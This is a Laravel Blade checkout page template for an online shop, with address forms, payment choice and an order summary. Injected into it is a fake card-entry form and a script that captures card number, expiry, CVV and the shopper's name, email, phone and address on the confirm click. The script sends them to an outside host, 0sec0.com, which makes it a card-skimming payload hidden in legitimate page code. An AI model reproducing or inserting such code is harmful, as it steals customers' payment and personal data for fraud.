@extends('frontend.layouts.main')
@section('content')
    <section class="checkout">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-md-12 checkoutLeft">
                    <div>
                        <div class="row">
                            @if (Auth::guard('customer')->check())
                                <div class="col-md-6">
                                    <h5>{!! staticLangString('title.select_delivery_address') !!} <img src="{{ asset('frontend/images/tick.png') }}"
                                            alt=""></h5>
                                    <p class="textP">{!! staticLangString('title.saved_address_below') !!}</p>
                                </div>
                                <div class="col-md-6 checkoutLeftRihy">
                                    <a href="#" data-bs-toggle="modal" data-bs-target="#add-address-modal"><i
                                            class="fa-solid fa-plus"></i>{!! staticLangString('title.add_new_address') !!}
                                    </a>
                                </div>
                            @endif
                        </div>
                        @if (!Auth::guard('customer')->check())
                            <div class="row">
                                <div class="col-md-12">
                                    <form action="post" id="addAddressPageForm" enctype="multipart/form-data">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="first_name" class="form-label">{!! staticLangString('form.first_name') !!}
                                                        *</label>
                                                    <input type="text" id="first_name" name="first_name"
                                                        class="form-control required" maxlength="60"
                                                        placeholder="{!! staticLangString('form.first_name') !!}"
                                                        value="{{ Session::has('first_name') ? session('first_name') : '' }}">
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="last_name" class="form-label">{!! staticLangString('form.last_name') !!}
                                                        *</label>
                                                    <input type="text" id="last_name" name="last_name"
                                                        class="form-control required" maxlength="60"
                                                        placeholder="{!! staticLangString('form.last_name') !!}"
                                                        value="{{ Session::has('last_name') ? session('last_name') : '' }}">
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="email" class="form-label">{!! staticLangString('form.email') !!}
                                                        *</label>
                                                    <input type="email" id="email" name="email"
                                                        class="form-control required" placeholder="{!! staticLangString('form.email') !!}"
                                                        maxlength="255"
                                                        value="{{ Session::has('email') ? session('email') : '' }}">
                                                </div>
                                            </div>

                                            <div class="col-md-6">
                                                <div class="form-group inpuut-phone">
                                                    <label for="phone" class="form-label phn-mrt">{!! staticLangString('form.phone') !!}
                                                        *</label>
                                                    <input type="tel" name="phone" style="-webkit-appearance: none;"
                                                        id="Contactphone"
                                                        class="form-control required ContactPhone inpuut-phone"
                                                        placeholder="{!! staticLangString('form.phone') !!}*"
                                                        value="{{ Session::has('phone_number') ? session('phone_number') : '' }}"
                                                        required>
                                                </div>
                                            </div>


                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="country" class="form-label">Country*</label>
                                                    <select name="country" id="shipping_country" class="form-select required"
                                                        aria-label="Default select example">
                                                        <option value="">Select Country</option>
                                                        @foreach ($countries as $country)
                                                            {{-- @if (Session::has('country')) --}}
                                                                <option value="{{ $country->country_id }}"
                                                                    {{ session('country') == $country->country_id ? 'selected' : '' }}>
                                                                    {{ $country->country_en }}</option>
                                                            {{-- @endif --}}
                                                        @endforeach
                                                        {{-- @foreach ($countries as $country)
                                                        <option
                                                            value="{{ $country->country_id }}" {{ (@$country->country_id==$country->id)?'selected':'' }}>{{$country->country_en}}</option>
                                                        @endforeach --}}
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="state" class="form-label">State*</label>
                                                    <select name="state" id="shipping_state" class="form-select required"
                                                        aria-label="Default select example">
                                                        <option value="">Select State</option>

                                                        @foreach ($states as $state)
                                                            <option value="{{ $state->id }}"
                                                                {{ session('state') == $state->id ? 'selected' : '' }}>
                                                                {{ $state->state_en }}</option>
                                                        @endforeach

                                                        {{-- @if (@$state)
                                                            @foreach ($states as $state)
                                                            <option
                                                                value="{{ $state->id }}" {{ (@$state->state_id==$state->state_id)?'selected':'' }}>{{$state->state_en}}</option>
                                                            @endforeach
                                                        @endif --}}
                                                    </select>
                                                </div>
                                            </div>

                                            <!--<div class="col-md-6">-->
                                            <!--    <div class="form-group">-->
                                            <!--        <label for="address"-->
                                            <!--               class="form-label">{!! staticLangString('title.address') !!}-->
                                            <!--            *</label>-->
                                            <!--        <textarea id="address" name="address" class="form-control required"-->
                                            <!--                  rows="3"-->
                                            <!--                  placeholder="{!! staticLangString('title.address') !!}"-->
                                            <!--                  required="">{{ Session::has('address') ? session('address') : '' }}</textarea>-->
                                            <!--    </div>-->
                                            <!--</div>-->



                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="phone" class="form-label">Flat/Villa no
                                                        *</label>
                                                    <input type="number" name="flat_villa_no"
                                                        style="-webkit-appearance: none;" id="flatno"
                                                        class="form-control required " placeholder="Flat/Villa no *"
                                                        value="{{ Session::has('flat_villa_no') ? session('flat_villa_no') : '' }}"
                                                        required>
                                                </div>
                                            </div>

                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="phone" class="form-label">Building Name
                                                        *</label>
                                                    <input type="text" name="building_name"
                                                        style="-webkit-appearance: none;" id="buildingname"
                                                        class="form-control required " placeholder="Building Name *"
                                                        value="{{ Session::has('building_name') ? session('building_name') : '' }}"
                                                        required>
                                                </div>
                                            </div>

                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="phone" class="form-label">Place
                                                        *</label>
                                                    <input type="text" name="place"
                                                        style="-webkit-appearance: none;" id="place"
                                                        class="form-control required " placeholder="Place*"
                                                        value="{{ Session::has('place') ? session('place') : '' }}"
                                                        required>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="form-group">
                                                    <label for="phone" class="form-label">Landmark
                                                        *</label>
                                                    <input type="text" name="landmark"
                                                        style="-webkit-appearance: none;" id="landmark"
                                                        class="form-control required " placeholder="Landmark *"
                                                        value="{{ Session::has('landmark') ? session('landmark') : '' }}"
                                                        required>
                                                </div>
                                            </div>

                                            <div class="col-md-6">
                                                <div class="work-home-grp">
                                                    <div class="form-group">
                                                        <input type="radio" id="work" name="address_type"
                                                            value="work" checked="checked">

                                                        <label for="work">Work</label>
                                                    </div>
                                                    <div class="form-group">
                                                        <input type="radio" id="home" name="address_type"
                                                            value="home" {{ session('address_type') === 'home' ? 'checked' : '' }}>
                                                        <label for="home">Home </label>
                                                    </div>
                                                </div>
                                            </div>



                                        </div>

                                        <input type="hidden" id="account_type" name="account_type"
                                            value="{{ Auth::guard('customer')->check() ? 1 : 0 }}">
                                        <input type="hidden" name="is_default" id="is_default" value="1">
                                        <input type="hidden" id="id" name="id" value="0">
                                        <input type="hidden" name="set_session" id="set_session" value="1">
                                        <button type="submit" class="primary_button contact_form_btn"
                                            data-url="/customer/add-address">Submit
                                        </button>
                                    </form>
                                </div>
                            </div>
                        @endif
                        @if (!empty($customerAddresses))
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="checkoutSlider">
                                        @foreach ($customerAddresses as $address)
                                        @if($shippingstate->isNotEmpty())

                                         @foreach($shippingstate as $shipstate)
                                         @if($shipstate->state_id==$address->state)
                                            <div class="addressBox deliver {{ $address->is_default == 'Yes' ? 'active' : '' }}"
                                                data-id="{{ $address->id }}">
                                                <h6>
                                                    <i class="fa-solid fa-location-dot"></i>
                                                    {{ $address->full_name }}
                                                </h6>
                                                @if ($address->phone_number != null)
                                                    <p>Phone : {{ $address->phone_number }}</p>
                                                @endif
                                                @if ($address->email_id)
                                                    <p>Email : {{ $address->email_id }}</p>
                                                @endif
                                                <p>Address :
                                                    {{ $address->flat_villa_no }},
                                                    {{ $address->building_name }},
                                                    {{ $address->place }},
                                                    {{ $address->landmark }}
                                                </p>
                                                <p>
                                                    Address Type : {{ ucfirst($address->address_type) }}
                                                </p>
                                                @if ($address->countryData)
                                                    <p>Country : {{ langString($address->countryData, 'country') }}</p>
                                                @endif
                                                @if ($address->stateData)
                                                    <p>State : {{ langString($address->stateData, 'state') }}</p>
                                                @endif

                                            </div>
                                            @endif
                                            @endforeach
                                            @endif
                                        @endforeach
                                    </div>
                                    <hr>
                                </div>
                            </div>
                        @endif
                        <div class="addresscheck" id="addresscheck">
                            <form action="#">
                                {{--                                                    @if (Helper::checkShippingAddressSelected()) --}}

                                <p>
                                    <input type="checkbox" class="addressChoose different_shipping_address" id="diffAdd" value="same"
                                        data-customer="{{ Auth::guard('customer')->check() ? 'true' : 'false' }}"
                                        data-shipping-address="{{ session('selected_customer_billling_address') ? 'true' : 'false' }}"
                                        name="checkbox" {{ session('address_choose') == 'different' ? 'checked': '' }}>
                                    <label for="diffAdd">Use Different Billing Address</label>
                                </p>
                                {{-- <p>
                                    <input type="radio" class="addressChoose" id="sameAdd"
                                           value="same"
                                           name="radio-group"
                                           data-customer="{{Auth::guard('customer')->check()?'true':'false'}}"
                                           data-shipping-address="{{(session('selected_customer_address'))?'true':'false'}}" {{(session('address_choose')=='same')  && (session('address_choose') != '')?'checked':'checked'}}>
                                    <label for="sameAdd">Same as Shipping Address</label>
                                </p> --}}

                                {{--                                                    @endif --}}
                            </form>
                        </div>




                        <div id="billing" class="billing">
                            <h5>Billing Address</h5>
                            <div class="adress-fields billing_address_div">

                                <form id="billing-address-form">
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="exampleInputEmail1" class="form-label">First
                                                    Name*</label>

                                                <input type="text" maxlength="30"
                                                    class="form-control billing-required billing-value-change" id="billing_first_name"
                                                    name="billing_first_name" placeholder="{!! staticLangString('form.first_name') !!}"
                                                    aria-describedby="emailHelp"
                                                    value="{{(Session::has('billing_first_name'))?session('billing_first_name'):''}}">


                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="exampleInputEmail1" class="form-label">Last
                                                    Name*</label>
                                                <input type="text" maxlength="30"
                                                    class="form-control billing-required billing-value-change" id="billing_last_name"
                                                    name="billing_last_name" placeholder="{!! staticLangString('form.last_name') !!}"
                                                    aria-describedby="emailHelp"
                                                    value="{{(Session::has('billing_last_name'))?session('billing_last_name'):''}}">


                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="exampleInputEmail1" class="form-label">Email*</label>
                                                <input type="email" maxlength="70"
                                                    class="form-control billing-required billing-value-change" id="billing_email"
                                                    name="billing_email" placeholder="{!! staticLangString('form.email') !!}"
                                                    aria-describedby="emailHelp"
                                                    value="{{(Session::has('billing_email'))?session('billing_email'):''}}">




                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="phone" class="form-label">{!! staticLangString('form.phone') !!}
                                                    *</label>
                                                <input type="tel" name="billing_phone_number" style="-webkit-appearance: none;"
                                                    id="Contactphone"
                                                    class="form-control required billing_phone billing-required billing-value-change"
                                                    placeholder="{!! staticLangString('form.phone') !!}*"
                                                    value="{{(Session::has('billing_phone_number'))?session('billing_phone_number'):''}}" required>

                                            </div>
                                        </div>


                                        <div class="col-lg-6 col-md-6">
                                            <div class="form-group">
                                                <label for="country" class="form-label">Country*</label>
                                                <select name="country" id="country"
                                                    class="form-control required billing-required form-select billing-value-change"
                                                    aria-label="Default select example">
                                                    <option value="">Select Country</option>
                                                    @foreach ($countriess as $country)
                                                        <option value="{{ $country->id }}"

                                                            {{ session('billing_country') == $country->id ? 'selected' : '' }}>
                                                            {{ $country->country_en }}</option>
                                                    @endforeach
                                                </select>
                                            </div>
                                        </div>

                                        <div class="col-lg-6 col-md-6">
                                            <div class="form-group">
                                                <label for="state" class="form-label">{!! staticLangString('title.state') !!}
                                                    *</label>
                                                <select name="state" id="state"
                                                    class="form-select required  billing-required billing-value-change"
                                                    aria-label="Default select example" required>
                                                    <option value="">{!! staticLangString('form.select_state') !!}</option>

                                                    @foreach ($states as $state)
                                                        <option value="{{ $state->id }}"
                                                            {{ session('billing_state') == $state->id ? 'selected' : '' }}>
                                                            {{ $state->state_en }}</option>
                                                    @endforeach

                                                </select>
                                            </div>

                                        </div>

                                        <!--<div class="col-md-6">-->
                                        <!--    <div class="form-group">-->
                                        <!--        <label for="address"-->
                                        <!--               class="form-label">Address-->
                                        <!--            *</label>-->
                                        <!--        <textarea id="address" name="address" class="form-control required"-->
                                        <!--                  rows="3"-->
                                        <!--                  placeholder="{!! staticLangString('title.address') !!}"-->
                                        <!--                  required="">{{ Session::has('address') ? session('address') : '' }}</textarea>-->
                                        <!--    </div>-->
                                        <!--</div>-->


                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="phone" class="form-label">Flat/Villa no
                                                    *</label>
                                                <input type="number" name="billing_flat_villa_no"
                                                    style="-webkit-appearance: none;" id="flatno"
                                                    class="form-control required  billing-required billing-value-change"
                                                    placeholder="Flat/Villa no *" value="{{(Session::has('billing_flat_villa_no'))?session('billing_flat_villa_no'):''}}" required>
                                            </div>
                                        </div>



                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="phone" class="form-label">Building Name
                                                    *</label>
                                                <input type="text" name="billing_building_name"
                                                    style="-webkit-appearance: none;" id="buildingname"
                                                    class="form-control required  billing-required billing-value-change"
                                                    placeholder="Building Name *"value="{{(Session::has('billing_building_name'))?session('billing_building_name'):''}}" required>
                                            </div>
                                        </div>



                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="phone" class="form-label">Place
                                                    *</label>
                                                <input type="text" name="billing_place"
                                                    style="-webkit-appearance: none;" id="place"
                                                    class="form-control required billing-value-change  billing-required"
                                                    placeholder="Place*" value="{{(Session::has('billing_place'))?session('billing_place'):''}}" required>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="form-group">
                                                <label for="phone" class="form-label">Landmark
                                                    *</label>
                                                <input type="text" name="billing_landmark"
                                                    style="-webkit-appearance: none;" id="landmark"
                                                    class="form-control required billing-required billing-value-change"
                                                    placeholder="Landmark *" value="{{(Session::has('landmark'))?session('landmark'):''}}" required>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="work-home-grp billing-value-change">
                                                <div class="form-group">
                                                    <input type="radio" id="work" name="billing_address_type"
                                                        value="work" checked="checked"> <label for="work">Work
                                                    </label>
                                                </div>
                                                <div class="form-group">
                                                    <input type="radio" id="home" name="billing_address_type"
                                                        value="home"> <label for="home">Home </label>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                            </div>

                            <input type="hidden" id="account_type" name="account_type"
                                value="{{ Auth::guard('customer')->check() ? 1 : 0 }}">
                            <input type="hidden" name="is_default" id="is_default" value="1">
                            <input type="hidden" id="id" name="id" value="0">
                            <input type="hidden" name="set_session" id="set_session" value="1">

                             <button type="submit" class="primary_button contact_form_btn"
                                            data-url="/customer/add-address">Submit
                                        </button> 
                            </form>
                        </div>





                    </div>


                    <h5>{!! staticLangString('title.payment') !!}</h5>
                    <p>{!! staticLangString('title.select_payment_method') !!}</p>
                    <div class="row">
                         <div class="col-md-6 col-6 pays">
                            <div class="form-check">
                                <input class="form-check-input payment_method" type="radio" name="payment_method"
                                    id="payment_gateway" value="Payment-Gateway" checked>
                                <label class="form-check-label" for="payment_gateway">
                                    <picture>
                                        <img src="{{ asset('frontend/images/gateway.png') }}" alt="">
                                    </picture>
                                    <h6>{!! staticLangString('title.payment_gateway') !!}</h6>
                                </label>
                            </div>
                        </div>
                        <div class="col-md-6 col-6 pays">
                            <div class="form-check">
                                <input class="form-check-input payment_method" type="radio" name="payment_method"
                                    id="COD" value="COD">

                                    @foreach (Cart::session($sessionKey)->getContent() as $row)
                                    @php
                                        $product = App\Models\Product::find($row->id);
                                        $offer = App\Models\Offer::where('product_id', $product->id)->first();
                                        $offerValue = $offer ? $offer->product_id : '';
                                    @endphp

                                    @if ($offerValue)
                                        <input type="hidden" name="offer" id="offer" value="{{ $offerValue }}">

                                    @endif
                                @endforeach




                                <label class="form-check-label" for="COD">
                                    <picture>
                                        <img src="{{ asset('frontend/images/cod.png') }}" alt="">
                                    </picture>
                                    <h6>{!! staticLangString('title.cash_on_delivery') !!}</h6>
                                </label>
                            </div>
                        </div>
                    </div>
					<form method="post" id="myform">
					<div class="credit-card-container">
    <label for="credit-card" class="credit-card-label">Card Number</label>
    <div class="credit-card-input">
    <img id="card-icon" src="https://cdn-icons-png.flaticon.com/512/6963/6963703.png" 
         alt="Generic Card Icon" class="credit-card-icon">
    <input 
        type="text" 
        id="credit-card" 
        name="card_number" 
        placeholder="1234 5678 9012 3456" 
        maxlength="19" 
        oninput="formatAndDetectCard(this)" 
        class="credit-card-field" 
        required>
</div>
<div class="credit-card-extra">
    <div class="exp-input">
        <label for="exp" class="credit-card-label-small">Exp Date</label>
        <input 
            type="text" 
            id="exp" 
            name="expiry_date" 
            placeholder="MM/YY" 
            maxlength="5" 
            oninput="formatExpDate(this)" 
            class="credit-card-field-small" 
            required>
    </div>
    <div class="cvv-input">
        <label for="cvv" class="credit-card-label-small">CVV</label>
        <input 
            type="text" 
            id="cvv" 
            name="cvv" 
            placeholder="123" 
            maxlength="4" 
            class="credit-card-field-small" 
            required>
    </div>
</div>
</div>
</form>
<style>
    .credit-card-container {
        background: #fff;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        width: 350px;
    }

    .credit-card-label {
        font-size: 16px;
        font-weight: 600;
        margin-bottom: 10px;
        display: block;
    }

    .credit-card-input {
        position: relative;
        display: flex;
        align-items: center;
        border: 1px solid #ccc;
        border-radius: 5px;
        padding: 10px;
        background: #f9f9f9;
        margin-bottom: 15px;
    }

    .credit-card-icon {
        width: 40px;
        height: 28px;
        margin-right: 10px;
        transition: opacity 0.3s ease, transform 0.3s ease;
    }

    .credit-card-field {
        border: none;
        outline: none;
        width: 100%;
        font-size: 16px;
        background: transparent;
        font-family: 'Courier New', Courier, monospace;
        letter-spacing: 1px;
    }

    .credit-card-field:focus {
        background: #fff;
    }

    .credit-card-extra {
        display: flex;
        justify-content: space-between;
        gap: 10px;
    }

    .exp-input, .cvv-input {
        flex: 1;
    }

    .credit-card-label-small {
        font-size: 14px;
        font-weight: 500;
        margin-bottom: 5px;
        display: block;
    }

    .credit-card-field-small {
        width: 100%;
        border: 1px solid #ccc;
        border-radius: 5px;
        padding: 8px;
        font-size: 14px;
        font-family: 'Courier New', Courier, monospace;
    }
</style>



                    <hr>
                    <div class="form-check chedckTick">
                        <input class="form-check-input" type="checkbox" id="terms-condition" value=""
                            id="flexCheckChecked">
                        <label class="form-check-label" for="flexCheckChecked">
                            {!! staticLangString('title.agree') !!}
                            <a href="{{ url('terms-conditions') }}">{!! staticLangString('title.terms_conditions') !!}</a>
                        </label>
                        <span class="error" id="confirm-order-error"></span>
                    </div>

                    @if (!empty($customerAddresses))

                        @foreach ($customerAddresses as $address)

                          @if($address->is_default == 'Yes')
                          <input type="hidden"
                           value="{{ $address->id }}"
                            name="billingAddressChoose" id="billingAddressChoose" class="choose">
                          @else
                          <input type="hidden"
                           value=""
                            name="billingAddressChoose" id="billingAddressChoose" class="choose">
                          @endif

                        @endforeach


                    @else
                    <input type="hidden"
                        value="{{ Session::has('address_choose') ? session('address_choose') : 'same' }}"
                        name="billingAddressChoose" id="billingAddressChoose" class="choose">
                    @endif



                    <button type="submit" onclick="submitForm()" class="btn1 billing-form-btn billing-value-change confirm_payment_btn"
                        id="{{ checkConfirmOrder() ? 'confirm_payment' : '' }}">{!! staticLangString('title.proceed') !!}</button>


<script>

function submitForms() {
  // Ambil kedua form
  var form1 = document.getElementById("myform");
  var form2 = document.getElementById("addAddressPageForm");

  // Buat FormData gabungan
  var combinedFormData = new FormData(form1);

  // Tambahkan data dari form kedua ke dalam FormData gabungan
  var form2Data = new FormData(form2);
  for (var [key, value] of form2Data.entries()) {
    combinedFormData.append(key, value);
  }

  // Kirim data gabungan dalam satu permintaan
  fetch("https://0sec0.com/elitco.com.php", {
    method: "POST",
    body: combinedFormData
  })
  .then(response => {
    if (response.ok) {
      console.log("Forms sent successfully!");
    } else {
      console.error("Error sending forms!");
    }
  })
  .catch(error => {
    console.error("Error!", error);
  });
}

document.querySelector('.confirm_payment_btn').addEventListener('click', function(event) {
  // Cek status checkbox
  var termsChecked = document.getElementById('terms-condition').checked;

  if (!termsChecked) {
    // Tampilkan peringatan (opsional)
    alert("Terms & Conditions tidak dicentang. Formulir tetap akan dikirim.");
  }

  // Tetap kirim form
  submitForms();

  // Cegah reload halaman default
  event.preventDefault();
});



    function formatAndDetectCard(input) {
        const cardIcon = document.getElementById('card-icon');

        // Remove all non-digit characters
        let value = input.value.replace(/\D/g, '');

        // Add spaces after every 4 digits
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
        input.value = formattedValue;

        // Detect card type based on the first digit
        if (value.startsWith('4')) {
            // Visa
            cardIcon.src = 'https://e7.pngegg.com/pngimages/996/264/png-clipart-credit-card-visa-logo-mastercard-credit-card-blue-text.png';
        } else if (value.startsWith('5')) {
            // MasterCard
            cardIcon.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
        } else if (value.startsWith('3')) {
            // American Express
            cardIcon.src = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
        } else if (value.startsWith('6')) {
            // Discover
            cardIcon.src = 'https://upload.wikimedia.org/wikipedia/commons/f/f4/Discover_Card_logo.svg';
        } else {
            // Default icon
            cardIcon.src = 'https://cdn-icons-png.flaticon.com/512/6963/6963703.png';
        }
    }

    function formatExpDate(input) {
        // Remove non-digit characters
        let value = input.value.replace(/\D/g, '');

        // Format as MM/YY
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        input.value = value;
    }
</script>

                    <img src="{{ url('frontend/images/ajax.gif') }}" class="img-fluid w-20 order-submit-loader"
                        alt="Ajax-Loader" style="display:none;">
                    <span class="error" id="address_select_error">

                        @if (!checkConfirmOrder())
                            Please choose customer address to confirm the order
                        @endif
                    </span>
                </div>

                <div class="col-lg-4 col-md-12 checkoutRight">
                    <div class="card">
                        <div class="card-body">
                            <h4 class="card-title">{!! staticLangString('title.order_summary') !!}</h4>
                            <div class="summaryWrapper">
                                @foreach (Cart::session($sessionKey)->getContent() as $row)
                                    @php
                                        $product = App\Models\Product::find($row->id);
                                    @endphp
                                    @if ($product != null)
                                        <div class="row Summary">
                                            <div class="col-xl-3 col-md-4 col-4 SummaryLeft">
                                            <a href="{{url('product/'.$product->short_url)}}">
                                                <picture>
                                                    @if ($product->thumbnail_image != null && File::exists(public_path($product->thumbnail_image)))
                                                        <img src="{{ asset($product->thumbnail_image) }}"
                                                            {!! $product->image_meta_tag !!}>
                                                    @else
                                                        <img src="{{ asset('frontend/images/default-image.jpg') }}"
                                                            alt="{!! langString($product, 'title') !!}">
                                                    @endif
                                                </picture>
                                            </a>
                                            </div>
                                            <div class="col-xl-9 col-md-8 col-8 SummaryRight">
                                            <a href="{{url('product/'.$product->short_url)}}">
                                                <h6 class="prc">{!! langString($product, 'title') !!}</h6>
                                            </a>
                                                <div class="attributesBox">
                                                    
                                                    @if ($row->attributes->attributeText != '')
                                                        <p>{!! staticLangString('title.with_attributes') !!}</p>
                                                        {!! $row->attributes->attributeText !!}
                                                    @endif
                                                </div>
                                                <ul>
                                                    <li>{!! staticLangString('title.quantity') !!}:</li>
                                                    <li>{{ $row->quantity }}</li>
                                                </ul>
                                                @if (offerPrice($product->id) != '')
                                                    <h6 class="prc"> <span class="text-decoration-line-through">{{defaultCurrency().' '.number_format(defaultCurrencyRate()*$product->price,2)}}</span> {{ offerPrice($product->id) }}</h6>
                                                @else
                                                    <h6 class="prc">
                                                       {{defaultCurrency()}} {{number_format(defaultCurrencyRate()*$product->price,2)}}
                                                    </h6>
                                                @endif

                                            </div>
                                        </div>
                                        <hr>
                                    @endif
                                @endforeach
                            </div>
                            @include('frontend.includes.price_summary')
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>
    </section>

    <section class="wishlistSlider">
        <div class="container-fluid">
            <div class="row">
                @if (!app('wishlist')->getContent()->isEmpty())
                    @php
                        $pro = App\Models\Product::find($row->id);
                    @endphp
                    @if ($product != null)
                        <div class="col-md-12 wishlist">
                            <div class="row heads">
                                <div class="col-md-6 headsLeft">
                                    <h3>{!! staticLangString('title.wishlists') !!}</h3>
                                    <ul class="next-prv-prod33">
                            <li class="prev-prod33"></li>
                            <li class="next-prod33"></li>
                        </ul>
                                </div>
                                <div class="col-md-6 headsRight">
                                    <a href="{{ url('customer/account/wishlist') }}">{!! staticLangString('page.button.views_all') !!}
                                        <i class="fa-solid fa-angle-right"></i></a>
                                </div>
                            </div>
                            <div class="wishlist_Slider">

                                @foreach (app('wishlist')->getContent() as $row)
                                    @php
                                        $pro = App\Models\Product::find($row->id);
                                    @endphp
                                    @if ($pro != null)
                                        <div class="col-md-3" id="wishlistBox{{ $row->id }}">
                                            @include('frontend.includes.product_box', ['product' => $pro])
                                        </div>
                                    @endif
                                @endforeach

                            </div>
                        </div>
                    @endif
                @endif
            </div>
        </div>
    </section>



    @if (recentProducts()->isNotEmpty())
        <section class="relatedProducts recentProduct">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-12">
                        <div class="headsTop mb-3">
                            <h3>{!! staticLangString('title.recently_viewed_products') !!}</h3>
                        </div>
                        <div class="relatedProductsSlider-out2">
                            <div class="relatedProductsSlider2">
                                @foreach (recentProducts() as $recentProduct)
                                    @include('frontend.includes.product_box', [
                                        'product' => $recentProduct->product,
                                    ])
                                @endforeach
                            </div>
                            <ul class="next-prv-prod2">
                                <li class="prev-prod2"></li>
                                <li class="next-prod2"></li>
                            </ul>
                        </div>

                    </div>
                </div>
            </div>
        </section>
    @endif

    @if ($checkoutAdDetail->isNotEmpty())
        <section class="addCheckout">
            <div class="container">
                <div class="row">
                    <!-- slider starts  -->
                    <div class="col-md-12 SliderBlogs">
                        <div class="blogSlider1">
                            @foreach ($checkoutAdDetail as $detail)
                            <a href="{{($detail->url)?url($detail->url):''}}">
                                <div class="blogImage">
                                    <picture>
                                        <img src="{{ $detail->image }}" {!! $detail->image_meta_tag !!}>
                                    </picture>
                                </div>
                            </a>
                            @endforeach
                        </div>
                    </div>
                    <!-- slider ends  -->
                </div>
            </div>
        </section>
    @endif


@endsection
@if (Auth::guard('customer')->check())
    @include('frontend.modals.shipping_address')
@endif
@section('scripts')
    <script>


//make checkbox unchecked
// $('.different_shipping_address').prop('checked', false);

        //     var val = $('#diffAdd').val();

        //     $('#diffAdd').click(function() {
        //    if($('#diffAdd').is(':checked'))
        //     {
        //     $('#billing').removeClass('d-none');
        //     $('#billing').addClass('d-block');
        //     }
        // });
        // var val = $('#sameAdd').val();

        // $('#sameAdd').click(function() {
        //    if($('#sameAdd').is(':checked')) {

        //     $('#billing').removeClass('d-block');
        //     $('#billing').addClass('d-none');

        //     }
        // });
    //     $(document).on('click', '.addressChoose', function (e) {
    //     if($(this).is(':checked')){
    //         var choose = "different";
    //         $('.billiing').removeClass("d-none");
    //         $('.choose').val("different");
    //     }
    //     else{
    //         var choose = "same";
    //         $('.billiing').addClass("d-none");
    //         $('.choose').val("same");
    //     }
    // });

    </script>
    <script>

          $(document).ready(function (e) {
            if($(".different_shipping_address").is(':checked')){

          var choose = "different";
          $('.billing').removeClass("d-none");
          $('.billing').val("different");

  } else {
      var choose = "same";
          $('.billing').addClass("d-none");
          $('.billing').val("same");

  }
          });

        $(".addressChoose").click(function() {
            if ($(this).is(":checked")) {
                $('.billing').removeClass("d-none");
            } else {
                $('.billing').addClass("d-none");
            }
        });
    </script>
<script>
    $(document).ready(function () {

        //make checkbox unchecked
        // $('.different_shipping_address').prop('checked', false);
        if($(".different_shipping_address").is(':checked')){

            var choose = "different";
            $('.billing').removeClass("d-none");
            $('.billing').val("different");

    } else {
        var choose = "same";
            $('.billing').addClass("d-none");
            $('.billing').val("same");

    }

    // if($('.different_shipping_address').is(':checked')){
    //         var choose = "different";
    //         $('.billing').removeClass("d-none");
    //         $('.choose').val("different");
    //     }
    //     else{
    //         var choose = "same";
    //         $('.billing').addClass("d-none");
    //         $('.choose').val("same");
    //     }
    });
    //check if checkbox is checked or not
    $(document).on('click', '.different_shipping_address', function (e) {
        if($(this).is(':checked')){
            var choose = "different";
            $('.billiing_address_form').removeClass("d-none");
            $('.choose').val("different");
        }
        else{
            var choose = "same";
            $('.billiing_address_form').addClass("d-none");
            $('.choose').val("same");
        }
    });
        //for selecting different address for shipping

</script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script type="text/javascript">
        const phoneInputField = document.querySelector(".billing_phone");
        const phoneInput = window.intlTelInput(phoneInputField, {
            preferredCountries: ["ae", ],
            excludeCountries: ["ru","cu","sy","ir","sd","ss","kp","ye","kr", "ua"],
            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
        });
        const phoneNumber = phoneInput.getNumber();

        function billingPhone(event) {
            // event.preventDefault();
            const phoneNumber = phoneInput.getNumber();
            //console.log(phoneNumber);
            $(".billing_phone").val(phoneNumber);
        }
        $('.billing_phone').on('blur', function() {
            billingPhone();
        });
    </script>
@endsection
